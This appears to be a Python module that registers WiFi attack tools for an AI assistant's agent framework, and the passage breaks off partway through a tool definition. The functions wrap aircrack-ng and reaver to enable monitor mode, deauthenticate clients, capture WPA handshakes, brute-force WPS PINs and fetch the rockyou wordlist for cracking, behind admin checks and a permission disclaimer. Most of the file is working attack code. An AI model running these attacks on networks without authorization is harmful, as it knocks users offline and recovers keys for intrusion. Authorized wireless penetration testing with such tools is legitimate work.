"""WiFi security testing tools. Use only on networks you own or have explicit permission to test."""
from __future__ import annotations

import logging
import os
import re
import shutil
import subprocess
import time
from pathlib import Path

from core.registry import tool
from core import tool_output

logger = logging.getLogger(__name__)

_WIRELESS_SUDOERS = "/etc/sudoers.d/plia-wireless"

# rockyou.txt lives in different places depending on the distro and is often
# shipped gzipped (Kali's `wordlists` package). We look in all the usual spots
# and decompress a local .gz into our own cache on first use, so the cracking
# tools work on Ubuntu/Mint/Debian where no `wordlists` package exists.
_ROCKYOU_URL = (
    "https://gitlab.com/kalilinux/packages/wordlists/-/raw/kali/master/rockyou.txt.gz"
)
_ROCKYOU_CANDIDATES = (
    "/usr/share/wordlists/rockyou.txt",
    "/usr/share/wordlists/rockyou/rockyou.txt",
    "/usr/local/share/wordlists/rockyou.txt",
    "/opt/wordlists/rockyou.txt",
    str(Path.home() / "wordlists" / "rockyou.txt"),
)
_ROCKYOU_GZ_CANDIDATES = ("/usr/share/wordlists/rockyou.txt.gz",)
# Kept for backwards compatibility with anything importing the old constant.
_ROCKYOU = _ROCKYOU_CANDIDATES[0]


def _wordlist_dir() -> Path:
    """Where Plia caches wordlists — follows the configured memory_dir."""
    from core.config import get_config
    return Path(os.path.expanduser(get_config().memory_dir)) / "wordlists"


def _rockyou_cache() -> Path:
    return _wordlist_dir() / "rockyou.txt"


def _rockyou_help() -> str:
    cache = _rockyou_cache()
    return (
        "rockyou.txt not found. Get it once with any of these:\n"
        f"  • Any distro: run the download_rockyou tool (≈51 MB, saved to {cache})\n"
        "  • Kali: sudo apt install wordlists\n"
        f"  • Manual: mkdir -p {cache.parent} && "
        f"curl -fL {_ROCKYOU_URL} | gunzip > {cache}"
    )


def _has_wireless_admin() -> bool:
    from core.config import get_config
    cfg = get_config()
    wireless_tools = (
        "start_monitor_mode", "stop_monitor_mode", "kill_interfering_processes",
        "capture_handshake", "attack_wps", "scan_wps_networks",
    )
    return (
        Path(_WIRELESS_SUDOERS).exists()
        and any(cfg.tool_permissions.get(t) == "admin" for t in wireless_tools)
    )


def _run(*cmd: str, timeout: int = 30, stream_tool: str = "") -> subprocess.CompletedProcess:
    """Run a command. ``stream_tool`` mirrors its output to the dashboard chat."""
    if stream_tool:
        return tool_output.stream(list(cmd), tool=stream_tool, timeout=timeout)
    try:
        return subprocess.run(list(cmd), capture_output=True, text=True, timeout=timeout)
    except subprocess.TimeoutExpired as exc:
        # Keep whatever the command printed before the deadline — aircrack/reaver
        # routinely report their result late, and dropping it loses the finding.
        return _timed_out(list(cmd), timeout, exc)


def _sudo(*cmd: str, timeout: int = 30, stream_tool: str = "") -> subprocess.CompletedProcess:
    """`_run` with sudo prefixed — the single place a privileged command is built."""
    return _run("sudo", *cmd, timeout=timeout, stream_tool=stream_tool)


def _timed_out(cmd: list[str], timeout: float,
               exc: BaseException | None = None) -> subprocess.CompletedProcess:
    """A failed result that still carries the output captured before the timeout."""
    partial = ""
    if exc is not None:
        raw = getattr(exc, "stdout", None) or getattr(exc, "output", None) or b""
        partial = raw.decode(errors="replace") if isinstance(raw, bytes) else (raw or "")
    return subprocess.CompletedProcess(
        cmd, -1, partial, f"timed out after {timeout}s",
    )


# On Debian/Ubuntu the aircrack suite lives in /usr/sbin, which is frequently
# absent from the PATH a GUI-launched process inherits. Searching PATH alone made
# every wireless tool claim the suite was not installed.
_EXTRA_BIN_DIRS = ("/usr/local/sbin", "/usr/sbin", "/sbin", "/usr/local/bin", "/usr/bin", "/bin")


def _bin_missing(name: str) -> str | None:
    """None when *name* is runnable, else *name*."""
    if shutil.which(name):
        return None
    for directory in _EXTRA_BIN_DIRS:
        candidate = os.path.join(directory, name)
        if os.access(candidate, os.X_OK) and not os.path.isdir(candidate):
            return None
    return name


_INSTALL_CMD = "sudo apt-get update && sudo apt-get install -y aircrack-ng reaver crunch"
_INSTALL_SUDO_HINT = (
    "Install needs administrator (sudo) permission, but no password prompt is "
    "available right now.\n"
    "Run this in a terminal, then run install_wireless_tools again:\n  " + _INSTALL_CMD
)
_INSTALL_DNS_HINT = (
    "Install failed because archive.ubuntu.com could not be resolved — a DNS/"
    "network problem, not a permissions problem.\n"
    "Check DNS with: getent ahosts archive.ubuntu.com\n"
    "Then retry, or run in a terminal:\n  " + _INSTALL_CMD
)


def _needs_password(stderr: str) -> bool:
    s = (stderr or "").lower()
    return ("a password is required" in s or "a terminal is required" in s
            or "no tty present" in s or "askpass" in s
            or "incorrect password" in s or "no password was provided" in s)


def _dns_failure(text: str) -> bool:
    t = (text or "").lower()
    return ("could not resolve" in t or "temporary failure resolving" in t
            or "temporary failure in name resolution" in t)


def _askpass_script() -> str | None:
    """Create a zenity askpass helper when a graphical session is available.

    sudo reads the password from this program's stdout directly; Plia never
    sees or stores it.
    """
    if not os.environ.get("DISPLAY") or not shutil.which("zenity"):
        return None
    import tempfile
    fd, path = tempfile.mkstemp(prefix="plia-askpass-", suffix=".sh")
    with os.fdopen(fd, "w") as fh:
        fh.write('#!/bin/sh\nexec timeout 180 zenity --password '
                 '--title="Plia needs administrator access" 2>/dev/null\n')
    os.chmod(path, 0o700)
    return path


def _run_apt(args: list[str], timeout: int = 300) -> subprocess.CompletedProcess:
    """Run apt-get through sudo, offering a GUI password prompt when needed.

    `sudo -n` keeps the common cached-credentials case silent; if that fails
    with a password error and a desktop session exists, retry with `sudo -A`
    and a zenity askpass helper. The password is typed into the native dialog
    and goes straight to sudo.
    """
    r = subprocess.run(["sudo", "-n", "apt-get", *args],
                       capture_output=True, text=True, timeout=timeout)
    if r.returncode == 0 or not _needs_password(r.stderr):
        return r
    script = _askpass_script()
    if script is None:
        return r
    try:
        env = {**os.environ, "SUDO_ASKPASS": script}
        return subprocess.run(["sudo", "-A", "apt-get", *args],
                              capture_output=True, text=True,
                              timeout=timeout, env=env)
    finally:
        try:
            os.unlink(script)
        except OSError:
            pass


@tool(description="Install aircrack-ng suite and wireless testing tools (airmon-ng, airodump-ng, aireplay-ng, reaver, wash, crunch). May show a password dialog when administrator access is needed.")
def install_wireless_tools() -> str:
    try:
        # Refresh indexes first: the most common install failure is a stale
        # package list or a transient DNS/network hiccup.
        upd = _run_apt(["update", "-o", "Acquire::Retries=3"], timeout=180)
        if upd.returncode != 0 and _needs_password(upd.stderr):
            return _INSTALL_SUDO_HINT

        r = _run_apt(["install", "-y", "-o", "Acquire::Retries=3",
                      "aircrack-ng", "reaver", "crunch"])
    except subprocess.TimeoutExpired:
        return ("Install timed out while waiting for apt-get. Check your network "
                "and retry, or run in a terminal:\n  " + _INSTALL_CMD)
    if r.returncode != 0:
        err = (r.stderr or r.stdout or "").strip()
        if _needs_password(err):
            return _INSTALL_SUDO_HINT
        if _dns_failure(err):
            return _INSTALL_DNS_HINT
        return f"Install failed: {err[-1500:]}"
    installed = []
    for b in ("airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng", "reaver", "wash", "crunch"):
        if not _bin_missing(b):
            installed.append(b)
    lines = [f"Installed. Available: {', '.join(installed)}"]
    # The `wordlists` package is Kali-only. Try it, then fall back to a direct
    # download so handshake cracking works on Ubuntu/Mint/Debian too.
    if not _find_rockyou()[0]:
        try:
            _run_apt(["install", "-y", "wordlists"], timeout=120)
        except subprocess.TimeoutExpired:
            pass
        if not _find_rockyou()[0]:
            lines.append(
                "No rockyou.txt found (the 'wordlists' package is Kali-only). "
                "Run download_rockyou to fetch it (~51 MB)."
            )
    return "\n".join(lines)


def _link_names() -> list[str]:
    """Interface names from `ip -o link show` (empty when ip is unavailable)."""
    try:
        r = subprocess.run(["ip", "-o", "link", "show"], capture_output=True, text=True, timeout=5)
    except (OSError, subprocess.SubprocessError):
        return []
    names = []
    for line in (r.stdout or "").splitlines():
        parts = line.split()
        if len(parts) >= 2:
            names.append(parts[1].rstrip(":"))
    return names


def _detect_wifi_interface() -> str | None:
    names = _link_names()
    # Prefer managed interface; fall back to base name derived from monitor interface
    for name in names:
        if name.startswith("wl") and not name.endswith("mon"):
            return name
    for name in names:
        if name.startswith("wl") and name.endswith("mon"):
            return name[:-3]  # strip "mon" to get original interface name
    return None


@tool(description="Put a wireless interface into monitor mode for packet capture. Requires Admin permission and Wireless Tools sudoers grant. Leave interface empty to auto-detect.")
def start_monitor_mode(interface: str = "") -> str:
    if not _has_wireless_admin():
        return "Permission denied. Set tool to Admin in Settings → Permissions and run the Wireless Tools grant command."
    miss = _bin_missing("airmon-ng")
    if miss:
        return "airmon-ng not found. Run: install_wireless_tools"
    iface = interface or _detect_wifi_interface()
    if not iface:
        return "No WiFi interface found. Specify interface name explicitly."
    mon = iface + "mon"
    existing = _detect_monitor_interface()
    if existing:
        return f"Already in monitor mode on {existing}"
    # 'airmon-ng check kill' is deliberately NOT run here: it stops NetworkManager
    # and takes the machine off the network. It is exposed as an explicit,
    # user-triggered action (kill_interfering_processes) instead.
    r = _sudo("airmon-ng", "start", iface, timeout=15)
    out = (r.stdout + r.stderr).strip()
    if r.returncode != 0:
        return f"Failed: {out}"
    result = f"Monitor mode started on {mon}\n{out}"
    if re.search(r"could cause trouble|check kill", out, re.I):
        result += (
            "\n\n⚠ Interfering processes detected — press 'Kill interfering processes' "
            "to run 'airmon-ng check kill', or call kill_interfering_processes."
        )
    return result


@tool(description="Kill processes that interfere with monitor mode by running 'airmon-ng check kill' "
      "(NetworkManager, wpa_supplicant, avahi-daemon). This takes the machine off WiFi/network until "
      "NetworkManager is restarted, so run it only when you intend to capture. "
      "Requires Admin + the Wireless Tools grant.")
def kill_interfering_processes() -> str:
    if not _has_wireless_admin():
        return "Permission denied. Set tool to Admin in Settings → Permissions and run the Wireless Tools grant command."
    if _bin_missing("airmon-ng"):
        return "airmon-ng not found. Run: install_wireless_tools"
    r = _sudo("airmon-ng", "check", "kill", timeout=30)
    out = (r.stdout + r.stderr).strip()
    if r.returncode != 0:
        return f"airmon-ng check kill failed: {out or 'unknown error'}"
    return (
        "Killed the processes that interfere with monitor mode.\n"
        + (out + "\n" if out else "")
        + "Next: run start_monitor_mode again so the adapter is put back in monitor "
          "mode with those processes gone (if one is already up it will say so).\n"
          "NetworkManager was stopped, so WiFi/network stays down until you run "
          "stop_monitor_mode (or 'sudo systemctl restart NetworkManager')."
    )


def _detect_monitor_interface() -> str | None:
    for name in _link_names():
        if name.endswith("mon"):
            return name
    return None


@tool(description="Stop monitor mode and restore interface to managed mode. Requires Admin permission. Leave interface empty to auto-detect.")
def stop_monitor_mode(interface: str = "") -> str:
    if not _has_wireless_admin():
        return "Permission denied. Set tool to Admin in Settings → Permissions."
    miss = _bin_missing("airmon-ng")
    if miss:
        return "airmon-ng not found. Run: install_wireless_tools"
    iface = interface or _detect_monitor_interface()
    if not iface:
        return "No monitor mode interface found."
    r = _sudo("airmon-ng", "stop", iface, timeout=15)
    out = (r.stdout + r.stderr).strip()
    if r.returncode != 0:
        return f"Failed: {out}"
    _sudo("systemctl", "restart", "NetworkManager", timeout=10)
    return f"Monitor mode stopped on {iface}. Network manager restarted."


@tool(description="Scan WiFi networks using monitor mode interface (airodump-ng). More detailed than nmcli scan. Requires Admin + monitor mode. Leave interface empty to auto-detect monitor interface.")
def monitor_scan_networks(interface: str = "", scan_seconds: int = 15) -> str:
    if not _has_wireless_admin():
        return "Permission denied. Set tool to Admin in Settings → Permissions."
    iface = interface or _detect_monitor_interface()
    if not iface:
        return "No monitor mode interface found. Run start_monitor_mode first."
    if _bin_missing("airodump-ng"):
        return "airodump-ng not found. Run: install_wireless_tools"
    networks = _airodump_scan(iface, min(scan_seconds, 30))
    if not networks:
        return "No networks found in scan window."
    return _format_ap_table(networks)


@tool(description="Capture a WPA handshake. Starts monitor mode automatically if the given interface is managed, checks that the target BSSID has a connected client, and verifies a handshake was captured. Set passive=true to skip deauth and wait for a client to reconnect naturally (needed for 802.11w/PMF clients). Use only on networks you own or have permission to test. Args: interface (managed or monitor), bssid, channel, output_dir (default /tmp), passive")
def capture_handshake(interface: str, bssid: str, channel: str, output_dir: str = "/tmp", passive: bool = False, deauth_rc: int = 1) -> str:
    if not _has_wireless_admin():
        return "Permission denied. Set tool to Admin in Settings → Permissions."
    if not interface or not bssid or not channel:
        return "interface, bssid, and channel are required."
    for b in ("airodump-ng", "aireplay-ng"):
        if _bin_missing(b):
            return f"{b} not found. Run: install_wireless_tools"
    if not (0 <= int(deauth_rc) <= 254):
        return "deauth_rc must be 0-254."
    if not passive:
        blocked = _injection_blocked(interface)
        if blocked:
            return blocked

    # Accept a managed interface: bring up monitor mode if one isn't already
    # available, then restore it when finished. Passing a monitor interface
    # (e.g. wlan0mon) leaves it running.
    mon = interface
    started_monitor = False
    if not _is_monitor_iface(mon):
        existing = _detect_monitor_interface()
        if existing:
            mon = existing
        else:
            r = _sudo("airmon-ng", "start", interface, timeout=15)
            if r.returncode != 0:
                detail = (r.stdout + r.stderr).strip() or "unknown error"
                return (
                    f"Could not start monitor mode on {interface}: {detail}\n"
                    "If NetworkManager/wpa_supplicant is holding the adapter, run "
                    "kill_interfering_processes (airmon-ng check kill) and retry, "
                    "or pass an existing monitor interface."
                )
            mon = _detect_monitor_interface() or f"{interface}mon"
            if not _is_monitor_iface(mon):
                return (
                    "airmon-ng reported success but no monitor interface appeared "
                    f"(expected {mon}). This adapter may not support monitor mode; "
                    "check `iw dev` and try a USB WiFi adapter."
                )
            started_monitor = True

    notes: list[str] = []
    if started_monitor:
        notes.append("Monitor mode was stopped and the adapter returned to "
                     "managed mode after the capture.")
    pre: dict | str
    cap_prefix = os.path.join(
        output_dir, f"plia_{bssid.replace(':', '')}_{int(time.time())}")
    try:
        pre = _preflight_target(mon, bssid, channel)
        if isinstance(pre, str) and started_monitor:
            # NetworkManager/wpa_supplicant can reclaim the adapter during the
            # scan (airodump then sees nothing). Stop them and retry once.
            _sudo("airmon-ng", "check", "kill", timeout=30)
            notes.append("Stopped NetworkManager/wpa_supplicant "
                         "(airmon-ng check kill) so they could not reclaim the adapter.")
            time.sleep(2)
            if not _is_monitor_iface(mon):
                _sudo("airmon-ng", "start", interface, timeout=15)
                mon = _detect_monitor_interface() or mon
            pre = _preflight_target(mon, bssid, channel)
        if isinstance(pre, str):
            return pre + ("\n" + "\n".join(notes) if notes else "")
        actual_channel = pre["channel"] or channel
        n_clients = len(pre.get("client_macs") or []) or pre.get("clients", 0)
        if passive:
            deauth_note = ("Passive capture: no deauth sent — the client must "
                           "reconnect on its own.")
        else:
            deauth_note = (
                "Deauth sent: broadcast"
                + (f" + unicast to {n_clients} client(s)" if n_clients else "")
                + f", {_CAPTURE_ATTEMPTS} attempts."
            )
        if passive:
            _emit_reconnect_prompt(interface, bssid, actual_channel,
                                   _PASSIVE_SECONDS)
        cap_file = _capture_handshake_file(
            mon, bssid, actual_channel, prefix_dir=output_dir, prefix=cap_prefix,
            client_macs=pre.get("client_macs"), deauth=not passive,
            passive_seconds=_PASSIVE_SECONDS if passive else None,
            deauth_rc=int(deauth_rc))
    finally:
        if started_monitor:
            _stop_monitor(mon)

    note = "\n".join(notes)
    if cap_file:
        n = handshake_count(cap_file, bssid)
        lines = [f"Handshake captured ({n} handshake{'s' if n != 1 else ''}) at {cap_file}"]
        lines.append(deauth_note)
        if note:
            lines.append(note)
        lines.append("Run crack_handshake_rockyou, crack_handshake_wordlist or "
                     "crack_handshake_auto to test.")
        return "\n".join(lines)

    cap_path = cap_prefix + "-01.cap"
    try:
        cap_size = Path(cap_path).stat().st_size
    except OSError:
        cap_size = 0
    timing = (f"during the {_PASSIVE_SECONDS}-second passive window"
              if passive else f"after {_CAPTURE_ATTEMPTS} attempts")
    lines = [
        f"No WPA handshake captured for {bssid} {timing} "
        f"({pre['clients']} client(s) were seen on the target)."
    ]
    if cap_size <= 24:
        lines.append(
            "The capture file is empty — the adapter did not capture any packets. "
            "Monitor mode is not working on this adapter."
        )
    else:
        lines.append(
            f"The capture has {cap_size} bytes but no complete 4-way handshake."
        )
        eapol = _eapol_frame_count(cap_path)
        if passive:
            if eapol == 0:
                lines.append(
                    "No EAPOL frames were captured. Passive mode sends no deauth, "
                    "so the client had to reconnect on its own. Toggle the client's "
                    "WiFi off/on (or forget and rejoin) during the window — and "
                    "target the BSSID/band it actually reconnects to."
                )
            elif eapol is not None and eapol < 4:
                lines.append(
                    f"Only {eapol} EAPOL frame(s) were captured; a complete "
                    "handshake needs 4. The reconnect may have started too late or "
                    "the client rejoined a different BSSID. Toggle WiFi off/on while "
                    "the capture is running and keep the target BSSID selected."
                )
        else:
            deauth = _deauth_frame_count(cap_path)
            if eapol == 0:
                if deauth:
                    lines.append(
                        f"Deauth was transmitted ({deauth} deauth frame(s) in the "
                        "capture), but the client did not attempt a handshake. This "
                        "is typical of 802.11w/PMF or a client that ignores deauth."
                    )
                else:
                    lines.append(
                        "No EAPOL and no deauth frames were captured — the deauth "
                        "injection failed on this adapter."
                    )
                lines.append(
                    "If the client ignores deauth (PMF/multi-link), run "
                    "capture_handshake(..., passive=true) and toggle its WiFi off/on "
                    "during the 90-second window, or monitor with a second adapter."
                )
            elif eapol is not None and eapol < 4:
                lines.append(
                    f"Only {eapol} EAPOL frame(s) were captured; a complete "
                    "handshake needs 4. The client's M2 reply is missing, so it "
                    "ignored deauth or was knocked off before replying."
                )
    lines.append(deauth_note)
    if passive:
        lines.append(
            "Passive tips: start the capture first, then turn the client's WiFi "
            "off/on; if it prefers 5 GHz, target the 5 GHz BSSID (ch40). A second "
            "adapter monitoring a client you control is more reliable."
        )
    else:
        lines.append(_NO_HANDSHAKE_HELP)
    if note:
        lines.append(note)
    return "\n".join(lines)


_WORDLIST_MAX_LEN = 15
_WORDLIST_MAX_CANDIDATES = 50_000_000  # ~0.6 GB; beyond this a file is impractical
_WORDLIST_CHARSET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"


@tool(description="Create a wordlist using crunch. Supports lengths up to 15 with a mixed letters+digits charset. Refuses absurd sizes instead of filling the disk. Args: min_len, max_len (max 15), charset (default mixed letters+digits), output_file")
def create_wordlist(min_len: int = 8, max_len: int = 8, charset: str = _WORDLIST_CHARSET, output_file: str = "/tmp/plia_wordlist.txt") -> str:
    if min_len < 1 or max_len > _WORDLIST_MAX_LEN or min_len > max_len:
        return f"min_len must be ≥1, max_len ≤{_WORDLIST_MAX_LEN}, min_len ≤ max_len."
    if not charset:
        return "charset cannot be empty."
    if _bin_missing("crunch"):
        return "crunch not found. Run: install_wireless_tools"
    candidates = 0
    try:
        candidates = sum(len(charset) ** n for n in range(min_len, max_len + 1))
    except OverflowError:
        candidates = 10**18
    if candidates > _WORDLIST_MAX_CANDIDATES:
        approx_gb = candidates * 11 / 1_000_000_000
        size_txt = (f"{approx_gb:.2e} GB" if approx_gb >= 1_000_000
                    else f"{approx_gb:,.1f} GB")
        cand_txt = (f"{candidates:.2e}" if candidates >= 1_000_000_000
                    else f"{candidates:,}")
        return (
            f"Refusing: ~{cand_txt} candidates (~{size_txt}) is too large to "
            "write. Use a shorter max_len, a narrower charset, or "
            "crack_handshake_auto for digits-only streaming."
        )
    r = _run("crunch", str(min_len), str(max_len), charset, "-o", output_file, timeout=120)
    if r.returncode != 0:
        return f"Failed: {r.stderr.strip()}"
    size = Path(output_file).stat().st_size if Path(output_file).exists() else 0
    return f"Wordlist saved to {output_file} ({size // 1024} KB)"


@tool(description="Scan for WPS-enabled networks using wash. Requires monitor mode interface. Args: interface (monitor mode), scan_seconds (default 20)")
def scan_wps_networks(interface: str, scan_seconds: int = 20) -> str:
    if not _has_wireless_admin():
        return "Permission denied. Set tool to Admin in Settings → Permissions."
    if not interface:
        return "interface required (must be in monitor mode)."
    if _bin_missing("wash"):
        return "wash not found. Run: install_wireless_tools"
    # Bound the scan with `timeout`: wash is stopped after scan_seconds even when it
    # prints nothing, so this always returns instead of blocking forever on readline().
    secs = max(1, min(scan_seconds, 60))
    try:
        proc = subprocess.run(
            ["timeout", str(secs), "sudo", "wash", "-i", interface],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
            timeout=secs + 10,
        )
    except subprocess.TimeoutExpired:
        return "WPS scan timed out. Is the interface in monitor mode? Run start_monitor_mode first."
    except Exception as exc:
        return f"WPS scan failed: {exc}"
    lines = (proc.stdout or "").splitlines()
    results = [l for l in lines if l and not l.startswith("BSSID") and not l.startswith("-") and not l.startswith("[")]
    if not results:
        if not interface.endswith("mon") and not interface.startswith("wl"):
            return (
                f"No WPS networks found. '{interface}' does not look like a WiFi monitor "
                "interface — WPS scanning needs a WiFi adapter in monitor mode (run "
                "start_monitor_mode first), not an Ethernet port."
            )
        err = (proc.stderr or "").strip()
        if err:
            return f"No WPS networks found. ({err.splitlines()[-1][:120]})"
        return "No WPS networks found. Ensure the interface is in monitor mode."
    return "\n".join(["BSSID              Ch  dBm  WPS  Lck  ESSID"] + results)


_WPS_PIXIE_DUST_TIMEOUT_S = 90    # a vulnerable AP gives up its key well inside this
_WPS_AUTO_STAGES = (300, 900, 1800)  # automatic PIN budgets, in order
_MAX_WPS_BUDGET_S = 3600          # cap for a user-requested extension


def _wps_session_file(bssid: str) -> Path:
    """Where reaver keeps this target's resumable session state."""
    from core.config import get_config
    base = Path(os.path.expanduser(get_config().memory_dir)) / "wps"
    base.mkdir(parents=True, exist_ok=True)
    return base / bssid.replace(":", "").upper()


def _reaver_run(interface: str, bssid: str, channel: str, timeout: int = 120,
                *, args: tuple[str, ...] = (), session: Path | None = None,
                stream_tool: str = "") -> str:
    """Run reaver against one WPS access point; return its combined output.

    Single definition of the reaver invocation, shared by the attack_wps tool and
    the WPS step of gain_wifi_access so both always use identical flags.
    """
    cmd: list[str] = ["reaver", "-i", interface, "-b", bssid, "-c", channel,
                      "-vv", "-t", "5", "-d", "1"]
    if session is not None:
        cmd += ["-s", str(session)]
    cmd += list(args)
    r = _sudo(*cmd, timeout=timeout, stream_tool=stream_tool)
    # A timed-out run still reports what reaver printed before the deadline.
    return (r.stdout or "") + ("\n" + r.stderr if r.stderr else "")


def _wps_finding(output: str) -> str | None:
    """The key reaver reported, if it got that far.

    Reaver prints the WPS PIN as soon as it has it and the WPA PSK only once it has
    retrieved the key, so the PSK is preferred: it is what actually joins the
    network, while the PIN alone still has to be traded for the key.
    """
    pin: str | None = None
    for line in (output or "").splitlines():
        stripped = line.strip()
        if "WPA PSK" in stripped:
            return stripped
        if pin is None and "WPS PIN" in stripped:
            pin = stripped
    return pin


def _emit_ui_event(event_type: str, payload: dict) -> None:
    """Thread-safe event emit for dashboard prompts (drops when headless)."""
    try:
        import asyncio
        from core import events, tool_output
        try:
            asyncio.get_running_loop()
        except RuntimeError:
            loop = tool_output._main_loop
            if loop is None or loop.is_closed() or not loop.is_running():
                return
            fut = asyncio.run_coroutine_threadsafe(
                events.emit(event_type, payload), loop)
            tool_output._pending.add(fut)
            fut.add_done_callback(tool_output._pending.discard)
        else:
            tool_output._dispatch(events.emit(event_type, payload))
    except Exception:
        logger.debug("Could not emit %s prompt", event_type, exc_info=True)


def _emit_wps_extend(interface: str, bssid: str, channel: str) -> None:
    """Ask the dashboard for an extension budget after all automatic stages."""
    _emit_ui_event("wps_extend_request", {
        "interface": interface,
        "bssid": bssid,
        "channel": channel,
        "stages": list(_WPS_AUTO_STAGES),
        "suggested_seconds": _MAX_WPS_BUDGET_S,
    })


def _emit_reconnect_prompt(interface: str, bssid: str, channel: str,
                           seconds: int) -> None:
    """Tell the dashboard to start the passive-capture reconnect countdown."""
    _emit_ui_event("wifi_reconnect_request", {
        "interface": interface,
        "bssid": bssid,
        "channel": channel,
        "seconds": seconds,
    })


@tool(description="Attack WPS PIN on a target network using reaver, to recover its Wi-Fi key. "
      "Tries Pixie Dust first, then runs automatic PIN stages of 300s, 900s and 1800s "
      "back-to-back (about 52 minutes total). After those stages it asks whether to "
      "extend and accepts a timeout in seconds. "
      "Use only on networks you own or have permission to test. Starts monitor mode "
      "automatically if the interface is managed. A full PIN brute force takes hours. "
      "Args: interface, bssid, channel, timeout_seconds (0 = automatic stages), pixie_dust")
def attack_wps(interface: str, bssid: str, channel: str,
               timeout_seconds: int = 0, pixie_dust: bool = True) -> str:
    if not _has_wireless_admin():
        return "Permission denied. Set tool to Admin in Settings → Permissions."
    if not interface or not bssid or not channel:
        return "interface, bssid, and channel are required."
    if _bin_missing("reaver"):
        return "reaver not found. Run: install_wireless_tools"
    blocked = _injection_blocked(interface)
    if blocked:
        return blocked
    try:
        requested = int(timeout_seconds)
    except (TypeError, ValueError):
        requested = 0
    auto = requested <= 0
    stages = list(_WPS_AUTO_STAGES) if auto else [min(requested, _MAX_WPS_BUDGET_S)]

    mon = interface
    started_monitor = False
    if not _is_monitor_iface(mon):
        existing = _detect_monitor_interface()
        if existing:
            mon = existing
        else:
            r = _sudo("airmon-ng", "start", interface, timeout=15)
            if r.returncode != 0:
                detail = (r.stdout + r.stderr).strip() or "unknown error"
                return (
                    f"Could not start monitor mode on {interface}: {detail}\n"
                    "If NetworkManager/wpa_supplicant is holding the adapter, run "
                    "kill_interfering_processes and retry."
                )
            mon = _detect_monitor_interface() or f"{interface}mon"
            if not _is_monitor_iface(mon):
                return (
                    "airmon-ng reported success but no monitor interface appeared. "
                    "Reaver needs a monitor-mode adapter; check `iw dev`."
                )
            started_monitor = True

    session = _wps_session_file(bssid)
    resumed = session.with_suffix(".wpc").exists()
    findings: list[str] = []
    note = ("Monitor mode was stopped and the adapter returned to managed mode."
            if started_monitor else "")
    last_pin = ""
    try:
        # Pixie Dust is quick and only worth trying once per run.
        if pixie_dust:
            pixie_out = _reaver_run(mon, bssid, channel, _WPS_PIXIE_DUST_TIMEOUT_S,
                                    args=("-K", "1"), session=session,
                                    stream_tool="attack_wps")
            found = _wps_finding(pixie_out)
            if found:
                return (f"Recovered via Pixie Dust: {found}"
                        + (f"\n{note}" if note else ""))
            findings.append("Pixie Dust: no key (AP is probably not vulnerable to it)")

        # PIN brute force, in stages. Reaver keeps its session file, so each
        # stage continues where the previous one stopped (when reaver writes it).
        for i, budget in enumerate(stages, 1):
            label = f"stage {i}/{len(stages)} ({budget}s)" if auto else f"extension ({budget}s)"
            pin_out = _reaver_run(mon, bssid, channel, budget, session=session,
                                  stream_tool="attack_wps")
            if pin_out.strip():
                last_pin = pin_out
            found = _wps_finding(pin_out)
            if found:
                return (f"Recovered via WPS PIN: {found}"
                        + (f"\n{note}" if note else ""))
            stopped = "timed out" in pin_out.lower()
            findings.append(
                f"PIN {label}: {'stopped' if stopped else 'finished'} without a key."
            )
            if "locked" in pin_out.lower():
                findings.append("The AP reports WPS locked, so it will refuse PIN "
                                "attempts until the lockout expires.")
                break
    finally:
        if started_monitor:
            _stop_monitor(mon)

    if auto:
        summary = ("Automatic WPS PIN stages complete (300s, 900s, 1800s); "
                   "no key was found.")
    else:
        summary = f"WPS PIN extension of {stages[0]}s finished without a key."
    findings.insert(0, summary)
    findings.append("A full WPS PIN brute force normally takes hours.")
    if resumed:
        findings.append("Resumed this target's earlier reaver session.")
    session_file = session.with_suffix(".wpc")
    if session_file.exists():
        findings.append(f"Progress is saved in {session_file}.")
    else:
        findings.append(
            "Reaver did not write a session file, so there is no PIN progress to "
            "resume from; it stopped before a checkpoint."
        )
    findings.append(
        "Do you want to extend it? Enter a timeout in seconds in the prompt "
        "(e.g. 3600), or call attack_wps with timeout_seconds=3600."
    )
    if note:
        findings.append(note)
    partial = tool_output.tail(last_pin, 6)
    if partial:
        findings.append("Last reaver output:\n" + partial)

    _emit_wps_extend(interface, bssid, channel)
    return "\n".join(f"- {f}" for f in findings)

def _decompress_rockyou(gz_path: Path) -> Path | None:
    """Decompress a rockyou.txt.gz into the user cache. Returns the .txt path."""
    import gzip
    import shutil

    cache = _rockyou_cache()
    tmp = cache.with_name(cache.name + ".part")
    try:
        cache.parent.mkdir(parents=True, exist_ok=True)
        with gzip.open(gz_path, "rb") as src, open(tmp, "wb") as dst:
            shutil.copyfileobj(src, dst, length=1024 * 1024)
        if tmp.stat().st_size == 0:
            tmp.unlink(missing_ok=True)
            return None
        tmp.replace(cache)
        return cache
    except (OSError, EOFError):
        logger.warning("Could not decompress rockyou wordlist from %s", gz_path, exc_info=True)
        tmp.unlink(missing_ok=True)
        return None


def _find_rockyou() -> tuple[str | None, str | None]:
    """Locate a usable rockyou.txt.

    Returns ``(path, error)``: on success ``path`` is set and ``error`` is None;
    when nothing usable exists ``path`` is None and ``error`` explains how to
    obtain it.
    """
    for candidate in _ROCKYOU_CANDIDATES:
        p = Path(candidate)
        try:
            if p.is_file() and p.stat().st_size > 0:
                return str(p), None
        except OSError:
            continue

    cache = _rockyou_cache()
    if cache.is_file() and cache.stat().st_size > 0:
        return str(cache), None

    for gz_candidate in (*_ROCKYOU_GZ_CANDIDATES, str(cache) + ".gz"):
        gz = Path(gz_candidate)
        if not gz.is_file():
            continue
        decompressed = _decompress_rockyou(gz)
        if decompressed:
            return str(decompressed), None
        return None, f"Found {gz} but could not decompress it — try download_rockyou."
    return None, _rockyou_help()


def _download_file(url: str, dest: Path, timeout: int = 600) -> str | None:
    """Download ``url`` to ``dest`` with curl, wget or urllib. Returns an error."""
    if _bin_missing("curl") is None:
        r = _run("curl", "-fL", "--retry", "2", "--connect-timeout", "15",
                 "-o", str(dest), url, timeout=timeout)
        return None if r.returncode == 0 else (r.stderr or r.stdout).strip()[-300:]
    if _bin_missing("wget") is None:
        r = _run("wget", "-q", "-O", str(dest), url, timeout=timeout)
        return None if r.returncode == 0 else (r.stderr or r.stdout).strip()[-300:]
    try:
        import urllib.request
        urllib.request.urlretrieve(url, dest)
        return None
    except Exception as exc:
        return str(exc)


@tool(description="Download the rockyou.txt wordlist (~51 MB) so the WPA handshake "
      "cracking tools can use it. Use when rockyou.txt is missing, e.g. on "
